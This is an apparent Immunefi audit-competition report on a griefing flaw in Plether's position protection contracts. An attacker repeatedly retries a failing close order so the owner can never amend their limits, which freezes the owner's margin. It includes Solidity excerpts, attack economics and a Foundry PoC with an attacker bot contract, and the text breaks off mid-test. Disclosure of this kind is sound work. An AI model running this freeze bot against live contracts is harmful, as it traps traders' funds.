# \#98965 [SC-High] Permissionless retry of unchanged failing `closeLimits` eliminates the sole `amendLatchedPositionProtectionCloseLimits` window, keeping margin unclosable

**Submitted on Nov 11th 2026 at 07:47:30 UTC by @dikanevn for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98965
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## 1. Summary

- **Protocol:** Plether
- **Repository:** `https://github.com/immunefi-team/audit-comp-plether` (commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`)
- **Asset:** `packages/perps/src/PositionProtectionBook.sol`, `packages/perps/src/router/OrderLiquidationBatchLogic.sol`
- **Severity:** `High`
- **Impact:** `High — Temporary freezing of funds for at least 24 hours` (continuous locking of trader position and collateral margin in `Triggered` status for over 24 hours via atomic `expireOrder + retryPositionProtectionClose` loops, with ongoing `carry` accrual and persistent market risk)
- **Weakness Type (CWE):** CWE-840 (Business Logic Errors), CWE-754 (Improper Check for Unusual or Exceptional Conditions)
- **Vulnerable Code Location:** `packages/perps/src/PositionProtectionBook.sol:382-406` (`retryPositionProtectionClose`)

### 1.1. Vulnerability Details

In the position protection subsystem (`PositionProtectionBook.sol`), once a take-profit or stop-loss trigger fires (`status == Triggered`), a deferred full-close order is enqueued with user-defined financial constraints `closeLimits` (`maxExecutionNotionalAssets`, `maxGrossAccountDebitAssets`, `maxActionChargeAssets`, `maxExplicitFeesAssets`). If the execution attempt fails (e.g., due to price slippage, VPI movements, or accumulated `carry` which grows monotonically and cannot revert on its own, yielding `TerminalReason.ConstraintViolation`) or expires due to timeout, the protection transitions into the `Latched` status, retaining the **exact same** `closeLimits`.

To allow traders to escape a deadlock caused by unexecutable limits, the `MED-9` fix introduced `amendLatchedPositionProtectionCloseLimits`, which allows **only the position owner** to widen `closeLimits` provided that `status == Latched` and `pendingOrderCounts(msg.sender) == 0`. The protocol's entire recovery model (as reflected in `SECURITY.md:547–552, 1356–1359`) assumes passive idle liveness — namely, that in the absence of keeper execution, the position will linger in `Latched`, the owner will comfortably update their limits, and an operator alert triggered by an extended `Latched` duration will wake up a keeper.

In reality, the opposite occurs: `retryPositionProtectionClose` remains **completely permissionless** (no `msg.sender == protection.account` check, no check of the previous failure reason, and no check verifying whether `closeLimits` were actually amended). Any arbitrary third-party address can instantly transition the protection from `Latched` back to `Triggered`, enqueuing a new zero-bounty order in `OrderRouter` with the **stale, unfulfillable `closeLimits`** for the full `maxExecutionWindowSeconds` window (default `60` seconds, up to `1 hours`). In doing so, an attacker completely eliminates the sole `Latched` window (as well as preventing operator alerts on a "long `Latched`" state).

While the protection remains in `Triggered` or `Latched` status, the position owner is completely locked out of managing their capital:
- They cannot update limits via `amendLatchedPositionProtectionCloseLimits` (reverts with `OrderRouter__ProtectionNotLatched()`).
- They cannot cancel the protection via `cancelPositionProtection` / `cancelPositionProtectionAndCommitClose` or replace it via `replacePositionProtection` (reverts with `OrderRouter__ProtectionNotArmed()`).
- They cannot submit a standard manual close order via `OrderRouter.commitOrder` (reverts with `OrderRouter__ProtectionActive()`).
- They cannot close the position directly through `CfdEngine` — their collateral margin remains trapped inside the position.

On Arbitrum, an attacker asserts continuous control using a multicall contract: either waiting for the default 60-second `executionDeadline` to elapse (a zero-bounty order offers no incentive for third-party keepers to execute early) and atomically calling `OrderRouter.expireOrder(linkedOrderId)` (`Triggered -> Latched`) immediately followed by `PositionProtectionBook.retryPositionProtectionClose(protectionId)` (`Latched -> Triggered`), or through an `executeOrder + retryPositionProtectionClose` sequence within a single transaction (since a failure due to `ConstraintViolation` does not revert execution, but transitions the status to `Latched`). Consequently, the `Latched` state collapses within a single transaction without existing for a single block or millisecond. As a result, the trader's position and collateral margin remain continuously frozen for more than 24 hours: the trader is completely stripped of the ability to close the trade or salvage their remaining equity, while the position remains subject to market risk and monotonic `carry` fee erosion.

---

## 2. Root Cause Analysis

### 2.1. Protection Lifecycle After Trigger and Status Deadlock

Following TP/SL activation (`triggerPositionProtection` -> `activate`), the `StoredProtection` record transitions into `Triggered`, and a child close order is submitted to `OrderRouter` with `executionBountyAssets = 0`. When the child order fails (e.g., with `ConstraintViolation` or `Expired`), `OrderRouter._settleTerminalBounty` (line 328) or `expireMismatchedOrderFromSidecar` (line 226) invokes `PositionProtectionBook.handleFailedProtectionAttempt` (`PositionProtectionBook.sol:637-675`):

```solidity
        delete _attemptProtectionIds[orderId];
        retained = _positionMatches(protection);
        emit PositionProtectionCloseAttemptFailed(protectionId, account, orderId, reason, retained);
        if (retained) {
            protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
            return true;
        }
```

While the protection remains active (`_activeProtectionIds[account] == protectionId`, which holds true for both `Triggered` and `Latched`), the trader is entirely locked out of managing their position:

1. **Cancellation and replacement are blocked** (`PositionProtectionBook.sol:270-277, 341-348, 408-419`):
```solidity
if (
    status != PositionProtectionTypes.PositionProtectionStatus.PendingOpen
        && status != PositionProtectionTypes.PositionProtectionStatus.Armed
) {
    revert OrderRouter__ProtectionNotArmed();
}
```
(`cancelPositionProtectionAndCommitClose` strictly requires `Armed`).

2. **Manual closing through OrderRouter is blocked** (`OrderLiquidationBatchLogic.sol:131-136, 313-315`):
```solidity
if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
    revert OrderRouter__ProtectionActive();
}
```
During user-initiated `commitOrder` calls, `enforceProtectionLock` is unconditionally set to `true`.

3. **Updating `closeLimits` is strictly restricted to the `Latched` status** (`PositionProtectionBook.sol:315-328`):
```solidity
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

The protocol's only designated exit path when constraints are violated is to await the `Latched` status and widen limits via `amendLatchedPositionProtectionCloseLimits`.

### 2.2. Lack of `closeLimits` Precondition in `retryPositionProtectionClose`

Although permissionless retrying in `retryPositionProtectionClose` (`PositionProtectionBook.sol:382-406`) was intended to preserve liveness, the function retrieves `_activeProtection(protectionId)` without enforcing any precondition verifying that `closeLimits` have been amended after an execution/constraint failure (or following an expired retry):

```solidity
    function retryPositionProtectionClose(
        uint64 protectionId
    ) external nonReentrant returns (uint64 linkedOrderId) {
        StoredProtection storage protection = _activeProtection(protectionId);
        if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
            revert OrderRouter__ProtectionNotLatched();
        }
        _requireMatchingPosition(protection);

        IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
        if (router.pendingOrderCounts(protection.account) != 0) {
            revert OrderRouter__PendingOrdersExist();
        }

        if (protection.linkedOrderId == 0 || _attemptProtectionIds[protection.linkedOrderId] != 0) {
            revert PositionProtectionBook__InvalidLinkedOrder();
        }
        uint64 expectedOrderId = router.nextCommitId();
        linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
            .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
        if (linkedOrderId != expectedOrderId) {
            revert PositionProtectionBook__InvalidHostResponse();
        }
        _recordCloseAttempt(protection, linkedOrderId);
    }
```

Subsequently, `OrderLiquidationBatchLogic.commitProtectionCloseAttempt` (`OrderLiquidationBatchLogic.sol:186-211`) builds the request via `_protectionCloseRequest` (`OrderLiquidationBatchLogic.sol:657-680`):

```solidity
        PositionProtectionTypes.CloseFinancialLimits memory limits =
            host.positionProtectionBook().closeFinancialLimits(protectionId);
        ...
        request.bounds.submitBy = uint64(block.timestamp);
        request.bounds.executionWindowSeconds = uint32(host.maxExecutionWindowSeconds());
        ...
        request.bounds.maxExecutionBountyAssets = 0;
        request.bounds.maxExecutionNotionalAssets = limits.maxExecutionNotionalAssets;
        request.bounds.maxGrossAccountDebitAssets = limits.maxGrossAccountDebitAssets;
        request.bounds.maxActionChargeAssets = limits.maxActionChargeAssets;
        request.bounds.maxExplicitFeesAssets = limits.maxExplicitFeesAssets;
```

And `_recordCloseAttempt` (`PositionProtectionBook.sol:564-578`) immediately transitions `protection.status` back to `Triggered` with a newly generated `linkedOrderId`.

Thus, any address can:
- Repeatedly enqueue a demonstrably unexecutable order with the stale, failing `closeLimits` (even after previous failures with `ConstraintViolation`, `ExecutionModeDisallowed`, or `PlannerRejected`);
- Incur zero bounty expense (`maxExecutionBountyAssets = 0`) while switching the status `Latched -> Triggered` and locking out `amendLatchedPositionProtectionCloseLimits` for another `maxExecutionWindowSeconds` duration (`60` seconds by default in `OrderExecutionOrchestrator.sol:11`, up to `1 hours` in `OrderRouterAdmin.sol:31`).

### 2.3. Guaranteed Exploitability on Arbitrum (Without Public Mempool)

On Arbitrum One, the sequencer processes transactions on a First-Come, First-Served (FCFS) basis without a public mempool, meaning traditional mempool frontrunning is neither needed nor utilized. Instead, an attacker leverages three deterministic interception vectors:

- **Scenario 1. Atomic `expireOrder + retryPositionProtectionClose` in a single transaction:**  
  The attacker's contract monitors `executionDeadline` of the active `linkedOrderId`. Because the child close order carries zero keeper incentive (`maxExecutionBountyAssets = 0`) and is guaranteed to fail limits, external keepers have zero economic motive to incur Pyth oracle gas costs. The order expires cleanly upon timeout (default `60` seconds), and the attacker atomically executes the following within a **single transaction**:
  - `OrderRouter.expireOrder(linkedOrderId)` -> in `OrderRecoverySidecar.sol:49-64`, the deadline check passes without invoking the oracle, the order is cleared (`pendingOrderCounts(account) == 0`), and `handleFailedProtectionAttempt` transitions the protection to `Latched`;
  - `PositionProtectionBook.retryPositionProtectionClose(protectionId)` -> immediately flips the protection back to `Triggered` with a new `linkedOrderId` and a fresh `maxExecutionWindowSeconds` window.  
  Between these two calls, there is zero block or millisecond gap — an EOA owner cannot physically interleave `amendLatchedPositionProtectionCloseLimits`.
- **Scenario 2. Atomic window closing by keeper-bot via `executeOrder + retryPositionProtectionClose`:**  
  If the attacker's bot acts as the keeper during the initial execution attempt, `OrderRouter.executeOrder` upon a `closeLimits` breach **does not revert the transaction**; it gracefully returns `LifecycleStatus.Failed` with `TerminalReason.ConstraintViolation` (`OrderLifecycleBook.sol:335-347`) and immediately calls `handleFailedProtectionAttempt`, setting the status to `Latched`. The bot's multicall contract immediately invokes `retryPositionProtectionClose` as the very next call, eliminating the `Latched` window right at step one.
- **Scenario 3. Reaction to third-party keepers:**  
  Even if an independent keeper executes `executeOrder` in isolation, a bot monitors the `PositionProtectionCloseAttemptFailed` event and submits `retryPositionProtectionClose` within sub-seconds via FCFS, whereas an ordinary user interacting through a web wallet interface cannot react and sign a transaction in time. All subsequent 1,440 cycles are then locked atomically via Scenario 1.

**Why the owner cannot compete in an FCFS race at `executionDeadline`:**

- **Standard EOA traders cannot use an external multicall contract:**  
  Ordinary users operate via standard EOAs and frontends. Neither `OrderRouter` nor `PositionProtectionBook` exposes an atomic `expireAndAmend(...)` helper or delegate/operator authorization mechanism. Furthermore, `amendLatchedPositionProtectionCloseLimits` (`PositionProtectionBook.sol:319`, `983-991`) strictly enforces `msg.sender == protection.account` via `_ownedActiveProtection(protectionId, msg.sender)` (reverting with `OrderRouter__Unauthorized()` otherwise). Consequently, a third-party helper contract invoked by Alice's EOA cannot amend her `closeLimits`: to compete with the attacker at `executionDeadline`, a retail trader would have to configure EIP-7702 delegation or trade from a custom Smart Account mid-crisis, authoring custom batch logic for `expireOrder -> amendLatchedPositionProtectionCloseLimits -> retryPositionProtectionClose`.
- **Even with Smart Accounts / EIP-7702, the attacker maintains asymmetric advantage:**  
  The attacker initiates each cycle and controls the exact timing. They can broadcast transactions to the sequencer with fine-grained timing precision (Arbitrum blocks arrive every ~250 ms) across multiple RPC endpoints. If the attacker's transaction arrives first at block `T >= executionDeadline + 1`, the owner's transaction reverts, and the window snaps shut for the full `maxExecutionWindowSeconds`.

### 2.4. Developer Blind Spot (MED-9 Fix Context and Tests)

The `closeLimits` and `amendLatchedPositionProtectionCloseLimits` features were introduced as a remediation for **MED-9** in Cecuro's audit (`audits/plether-ai-audit-report-2026-10-26.pdf`, page 27), where the protocol team documented:
> *"Only the owner may amend the retained ceilings while protection is Latched; keepers cannot relax them... Tight limits may prevent execution until conditions improve or the owner amends them."*

However, in the official unit test `packages/perps/test/perps/spec/trader/PositionProtection.t.sol:954-1005` (`test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry`), the developers only tested an uncontested sequence: protection transitions to `Latched`, `ALICE` calls `amendLatchedPositionProtectionCloseLimits` without interference, and only then does `CAROL` call `retryPositionProtectionClose`. The adversarial scenario, where `CAROL` (or an automated bot) repeatedly preempts `Latched` via `retryPositionProtectionClose` and perpetually starves `ALICE` from calling `amendLatchedPositionProtectionCloseLimits`, was completely unaddressed.

---

## 3. Practical Impact

### 3.1. Position and Collateral Margin Freezing (`Temporary freezing of funds`)

When `closeLimits` become unfulfillable (e.g., due to market gaps passing the stop-loss, shifts in VPI, or cumulative `carry` exceeding the allowance), the trader's only legitimate escape route is amending their limits via `amendLatchedPositionProtectionCloseLimits`. By suppressing this call, an attacker completely deprives the trader of the ability to close the position (either through protection or manually via `OrderRouter.commitOrder`) and reclaim their collateral margin.

Crucially, this fund freeze does not rely on speculative market conditions:
- If `ConstraintViolation` is triggered by accrued `carry` (`effects.carryCollectedAssets > maxActionChargeAssets` or `maxGrossAccountDebitAssets` in `OrderLifecycleBook.sol:335-347`), unlike market price, `carry` in `CfdEnginePlanLib._pendingCarryAssets` (`CfdEnginePlanLib.sol:183-197`) accumulates monotonically and **never decreases on its own** — such a limit will never become passable without calling `amendLatchedPositionProtectionCloseLimits` (or until liquidation).
- Even in a stop-loss price gap scenario, the explicit purpose of a stop-loss is to cap losses during adverse market momentum; while the market trades outside the limit and moves toward liquidation, the trader is prevented from widening slippage tolerance to rescue remaining capital.
- **Liquidation is not an alternative exit route for the locked trader:** as long as the position remains solvent (`netEquity >= maintenanceMargin`), neither the trader nor any keeper can trigger liquidation — `executeLiquidation` is strictly rejected by solvency checks in the core `CfdEngine`. The trader remains entirely frozen out. If adverse market movement eventually drives the unclosable position into insolvency, the outcome is not margin return, but total capital loss alongside liquidation penalty deductions.

### 3.2. Continuous Lock for 24+ Hours and Attack Economics on Arbitrum

A single `expireOrder + retryPositionProtectionClose` cycle requires neither an open position, nor a capital deposit, nor Pyth oracle fee expenditure from the attacker (the oracle is not invoked during `expireOrder` and `retryPositionProtectionClose`).

Based on precise gas measurements from the Foundry PoC below (`gasleft()` inside `ProtectionFreezeBot.expireAndRetry`):
- Function execution consumes `1,117,751` gas on cycle 1 and `1,117,766` gas in steady-state on cycle 65.
- The full L2 transaction (including `21,000` base gas + `68` bytes calldata = `1,088` gas) equals exactly **`1,139,848` L2 execution gas** per transaction, or **`1,641,381,120` gas** across `1,440` cycles (`68.93 USD` total L2 execution at `0.02 gwei`).
- **L1 Poster Fee:** Publishing `68` bytes of calldata in an L1 blob on Arbitrum One post-EIP-4844 costs fractions of a cent per transaction (~`0.10–0.20 USD` across all `1,440` txs), having negligible impact on overall attack cost.

According to Arbiscan Gas Tracker, **Arbitrum One** network utilization is typically minimal, with an average base gas price of **`0.02 gwei`**. The attacker's L2 execution costs under the default `maxExecutionWindowSeconds = 60` s window and an **`ETH = 2,100 USD`** exchange rate are:
- **1 cycle** (`61` s): `1,139,848` gas (`0.0000228 ETH` = `0.047 USD`);
- **1+ hour** (`3,965` s, `65` cycles): `~74.09M` gas (`0.001482 ETH` = `3.11 USD`);
- **24+ hours** (`87,840` s = `24.4` hours, `1,440` cycles): `1,641,381,120` gas (`0.032828 ETH` = **`68.93 USD`**).

**Frozen User Capital vs. Attack Cost on Arbitrum:**

In the PoC test fixture, the trader opens a `200,000 USD` notional position with `50,000 USD` collateral margin at a baseline mark price of `1.00`. When the market shifts to the stop-loss price of `1.15`, unrealized PnL loss (`30,000 USD`), opening fees, and accrued carry (~`290 USD`) leave `19,710.00 USD` in net equity (`netEquity`). Over the 24-hour freeze, an additional `3.14 USD` in monotonic carry accrues, reducing net equity to `19,706.86 USD`:
- **Frozen User Funds:** **`19,706.86 USD`** of remaining net equity that the trader cannot close, modify, or withdraw for over 24 hours.
- **Attacker Cost for 24.4 hours (1,440 cycles):** **`68.93 USD`** in L2 execution gas (at `0.02 gwei` base fee and `ETH = 2,100 USD`).
- **Freeze-to-Cost Ratio:** **`1 to 285.8`** (every `1 USD` spent by the attacker freezes `285.80 USD` of victim equity).
- **Unavoidable Carry Leakage:** Over the freeze period, **`3.13 USD`** of carry fees accrue (`3.14 USD` net equity reduction), proving that the position is unclosable and that capital actively degrades even in a flat market.
- **Market Risk:** As the market trends unfavorably, the trader, unable to execute their stop-loss or adjust constraints, faces total liquidation of all locked funds (`19,706.86 USD`).
- **During a 10x gas spike during market volatility** (if L2 base fee reaches `0.20 gwei`): the attacker's cost is `~0.47 USD` per cycle and `~689 USD` for 24 hours to lock the same `19,706.86 USD` in user capital.

### 3.3. Monotonic `carry` Accrual and Inability to Salvage Remaining Equity

While the position is forcibly locked, `carry` accrues continuously (`3.13 USD` over `24.4` hours in the PoC), acting as an unavoidable parasitic drain that proves the inability to exit the trade. Concurrently, the underlying position remains exposed to full market risk: if prices deteriorate, the trader cannot widen slippage via `amendLatchedPositionProtectionCloseLimits` to close their trade, risking total forfeiture of remaining `netEquity` (~`19,700 USD` in the PoC).

### 3.4. Immunefi Classification (Plether Perps Scope)

- **Severity Level:** `High` — matching the official Plether Impacts in Scope: **`High — Temporary freezing of funds for at least 24 hours`**, verified by a runnable Foundry PoC running `1,440` consecutive cycles (`87,840` seconds = `24.4` hours) and a detailed cost-of-attack calculation on Arbitrum (`68.93 USD` L2 execution at `0.02 gwei`, `ETH = 2,100 USD`).
- **Known Issues Analysis:** In `packages/perps/SECURITY.md` (lines 547–552 and 1356–1359) and `audits/scan-plether-fi-plether-core-d4541b49.md` (lines 542–585), only the irreversibility of triggers, uncompensated retries, and keeper liveness dependency during `Latched` states are acknowledged. The reverse vector — actively suppressing the `Latched` state, defeating operator alerts for extended `Latched` positions, and permanently deadlocking `amendLatchedPositionProtectionCloseLimits` via permissionless `retryPositionProtectionClose` — is neither documented nor mitigated in the scope commit `a82d4fef` or any `plether-core` branch.

---

## Proof of Concept

## 4. Proof of Concept (PoC)

The Foundry PoC below demonstrates:
- Continuous freezing of a `200,000 USD` notional / `50,000 USD` initial margin position (~`19,710 USD` residual `netEquity` at trigger) for over 24 hours (`1,440` consecutive cycles) after a tight `maxActionChargeAssets = 102 USD` limit (`92 USD` closing fee + `10 USD` carry budget) is breached by monotonic carry accrual, measuring gas consumption across the first `65` cycles and tracking `netEquity` degradation;
- Control test `test_Control_AtTrigger_SameLimitsExecuteWithoutAmend`, proving that at the moment of trigger, the exact same `closeLimits` were fully executable without amendment;
- Control test `test_Control_WithoutAttacker_OwnerCanAmendAndClose`, proving that absent attacker interference, the owner cleanly widens limits in `Latched` and closes the position.

**Note on PoC Fixture and the Binding Limit:** In the test, wide caps (`500,000 USD`) are set for the other three constraints (`maxExecutionNotionalAssets`, `maxGrossAccountDebitAssets`, `maxExplicitFeesAssets`), isolating `maxActionChargeAssets = 102 USD` (`92 USD` close fee + `10 USD` carry budget) as the binding constraint. The pre-trigger warp `PRE_TRIGGER_WARP_SECONDS = 279_950` s (~`3.24` days) is calibrated so that at trigger time, accrued carry equals `9.99 USD` (`actionCharge = 101.99 USD <= 102.00 USD`), leaving a slack of ~`0.01 USD`, which expires within `50` seconds. This demonstrates the exact condition the **MED-9** fix was designed to solve: a tight cap that is valid at trigger but degrades within the execution window and drops the protection into `Latched`.

### 4.1. Step-by-Step Attack Scenario

1. **Protection Creation with Realistic Limits:** Trader Alice opens a position and arms TP/SL protection via `PositionProtectionBook.createPositionProtection`, establishing `closeLimits` (`maxActionChargeAssets = 102 USD`, covering a `92 USD` close fee and a `10 USD` carry budget) that are fully executable at opening.
2. **Stop-Loss Trigger and Transition to `Triggered`:** Once the trigger price is reached, a keeper calls `PositionProtectionBook.triggerPositionProtection`, transitioning the protection into `Triggered` and enqueuing a child close order. At trigger time, accrued carry is `9.99 USD`, satisfying constraints (`101.99 USD <= 102.00 USD`).
3. **Execution Failure via Monotonic Carry and Transition to `Latched`:** Within the 60-second window (+50s), monotonic carry pushes total charges above the `102.00 USD` ceiling. When the keeper attempts execution, it fails with `TerminalReason.ConstraintViolation`. `PositionProtectionBook.handleFailedProtectionAttempt` cleans up the order and marks the protection as `Latched`.
4. **Trader Lockout by Protocol Architecture:** While protection is active (`Triggered` or `Latched`), the trader cannot close manually via `OrderRouter.commitOrder` (reverts with `OrderRouter__ProtectionActive`), cannot cancel via `cancelPositionProtection` (reverts with `OrderRouter__ProtectionNotArmed`), and cannot close directly in `CfdEngine`. The only architectural exit is waiting for `Latched` and calling `PositionProtectionBook.amendLatchedPositionProtectionCloseLimits`.
5. **Atomic Window Preemption by Attacker:** The attacker's bot monitors the `executionDeadline` of the child order. The moment `block.timestamp > executionDeadline`, the attacker executes the following in a **single transaction** via `ProtectionFreezeBot`:
   - Calls `OrderRouter.expireOrder(linkedOrderId)`, transitioning protection `Triggered -> Latched`;
   - Immediately calls `PositionProtectionBook.retryPositionProtectionClose(protectionId)`.  
   Because `retryPositionProtectionClose` is permissionless, it checks neither `msg.sender == owner` nor limit amendments, immediately re-enqueuing an order with the same failing limits and returning status `Latched -> Triggered`.
6. **Continuous 24+ Hour Freeze:** Executing both calls atomically ensures that the `Latched` state does not exist for a single block or millisecond, physically preventing Alice's EOA from invoking `amendLatchedPositionProtectionCloseLimits`. Repeating this sequence every 60 seconds across 1,440 cycles costs the attacker only `68.93 USD` per day on Arbitrum One, while Alice's margin remains trapped, her position cannot be closed, and her residual equity (~`19,700 USD`) remains exposed to market risk and monotonic carry attrition.

### 4.2. Runnable PoC Instructions

#### 4.2.1. Clone Repository and Checkout Commit
```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
```

#### 4.2.2. Create PoC Test File

```bash
cat << 'EOF' > packages/perps/test/perps/spec/trader/PositionProtectionRetryFreezePoC.t.sol
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {AccountLensViewTypes} from "@plether/perps/interfaces/AccountLensViewTypes.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

contract ProtectionFreezeBot {

    IPerpsKeeper public immutable KEEPER;
    IPositionProtectionActions public immutable PROTECTION;

    constructor(
        address router,
        address protectionBook
    ) {
        KEEPER = IPerpsKeeper(router);
        PROTECTION = IPositionProtectionActions(protectionBook);
    }

    function expireAndRetry(
        uint64 expiredOrderId,
        uint64 protectionId
    ) external returns (uint64 nextOrderId) {
        KEEPER.expireOrder(expiredOrderId);
        nextOrderId = PROTECTION.retryPositionProtectionClose(protectionId);
    }

}

contract PositionProtectionRetryFreezePoCTest is BasePerpTest {

    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;
    ProtectionFreezeBot internal bot;

    address internal constant ALICE = address(0xA11CE);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant EXECUTION_KEEPER = address(0xE0EC);
    address internal constant ATTACKER = address(0xBAD);

    uint256 internal constant MARK_PRICE = 1e8;
    uint256 internal constant POSITION_SIZE = 200_000e18;
    uint256 internal constant POSITION_MARGIN_ASSETS = 50_000e6;
    uint256 internal constant LONG_TAKE_PROFIT = 90_000_000;
    uint256 internal constant LONG_STOP_LOSS = 110_000_000;
    uint256 internal constant SL_TRIGGER_PRICE = 115_000_000;
    uint256 internal constant PRE_TRIGGER_WARP_SECONDS = 279_950; // ~3.24 days Armed (~$9.999 carry + $92 close fee <= $102 limit)
    uint256 internal constant ACTION_CHARGE_LIMIT_ASSETS = 102e6; // $92 execution fee (4 bps) + $10 carry budget

    function setUp() public override {
        super.setUp();
        address book = address(router.positionProtectionBook());
        protectionActions = IPositionProtectionActions(book);
        protectionViews = IPositionProtectionViews(book);
        bot = new ProtectionFreezeBot(address(router), book);

        _fundTrader(ALICE, 100_000e6);
        _refreshMark(MARK_PRICE);
    }

    function test_PoC_PermissionlessRetry_BlocksAmendAndFreezesPositionOver24Hours() public {
        _startRecordingLogs();
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);

        // 1. Wide notional/debit/fee bounds (500,000 USD); binding limit is maxActionChargeAssets = $102 ($92 close fee + $10 carry budget, ~$0.01 slack at trigger).
        PositionProtectionTypes.PositionProtectionParams memory params = _realisticProtectionParams();
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);

        // 2. Position sits Armed for ~3.24 days; SL triggers at 1.15 while total action charge is STILL <= $102 (passable at trigger).
        vm.warp(vm.getBlockTimestamp() + PRE_TRIGGER_WARP_SECONDS);
        uint256 carryAtTrigger = _totalCarryDue(ALICE);
        assertLe(carryAtTrigger, 10e6, "carry + $92 fee stays <= $102 at trigger");

        uint64 linkedOrderId = _triggerAt(protectionId, SL_TRIGGER_PRICE);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
        );
        AccountLensViewTypes.AccountLedgerSnapshot memory snapAtTrigger =
            engineAccountLens.getAccountLedgerSnapshot(ALICE);

        // 3. Within the 60s execution window (+50s), monotonic carry pushes action charge above $102; keeper fails with ConstraintViolation -> Latched.
        vm.warp(vm.getBlockTimestamp() + 50);
        uint256 carryAtFirstAttempt = _totalCarryDue(ALICE);
        assertGt(carryAtFirstAttempt, 10e6, "monotonic carry pushes actionCharge ($92 fee + carry) above $102");

        bytes[] memory executionData = _mockPythUpdateData(SL_TRIGGER_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory firstResult = router.executeOrder(linkedOrderId, executionData);
        assertEq(uint8(firstResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(firstResult.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );

        uint256 freezeStart = vm.getBlockTimestamp();

        // 4. Unprivileged attacker immediately retries with the old failing closeLimits (Triggered again).
        vm.prank(ATTACKER);
        linkedOrderId = protectionActions.retryPositionProtectionClose(protectionId);

        // 5. Alice is completely locked out: she cannot amend limits, cancel protection, or close manually.
        _assertAliceLockedOut(protectionId);

        uint256 cycles = 1440;
        uint256 meteredCycles = 65;
        uint256 meteredTotalGas;
        uint256 firstCycleGas;
        uint256 lastMeteredCycleGas;

        // 6. Over 1,440 cycles (> 24 hours), attacker atomically expires & retries in a single transaction,
        //    leaving zero block/timestamp gap for an EOA owner to call amendLatchedPositionProtectionCloseLimits.
        //    The first 65 cycles run with full gas metering; metering is paused afterward only to stay under
        //    Foundry's 1.07B single-test gas cap (on Arbitrum each cycle is an independent ~1.14M-gas tx).
        for (uint256 i; i < cycles; ++i) {
            uint64 deadline = router.lifecycleBook().orderTiming(linkedOrderId).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);

            if (i == meteredCycles) vm.pauseGasMetering();
            vm.prank(ATTACKER);
            uint256 gasBefore = gasleft();
            linkedOrderId = bot.expireAndRetry(linkedOrderId, protectionId);
            if (i < meteredCycles) {
                uint256 cycleGas = gasBefore - gasleft();
                if (i == 0) firstCycleGas = cycleGas;
                lastMeteredCycleGas = cycleGas;
                meteredTotalGas += cycleGas;
            }

            assertEq(
                uint8(protectionViews.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
            );
        }
        vm.resumeGasMetering();

        uint256 frozenDuration = vm.getBlockTimestamp() - freezeStart;
        uint256 txIntrinsicAndCalldataGas = 21_000 + 68 * 16; // 21k base + 68B non-zero calldata upper bound
        uint256 avgCallGas = meteredTotalGas / meteredCycles;
        uint256 avgTxL2Gas = avgCallGas + txIntrinsicAndCalldataGas;
        uint256 projected24hL2Gas = avgTxL2Gas * cycles;
        uint256 arbGasPriceWei = 0.02 gwei;
        uint256 ethPriceUsd = 2100;
        uint256 cycle1UsdThousandths = ((firstCycleGas + txIntrinsicAndCalldataGas) * arbGasPriceWei * ethPriceUsd * 1000) / 1e18;
        uint256 cycle65UsdThousandths = ((lastMeteredCycleGas + txIntrinsicAndCalldataGas) * arbGasPriceWei * ethPriceUsd * 1000) / 1e18;
        uint256 projected24hUsdCents = (projected24hL2Gas * arbGasPriceWei * ethPriceUsd * 100) / 1e18;

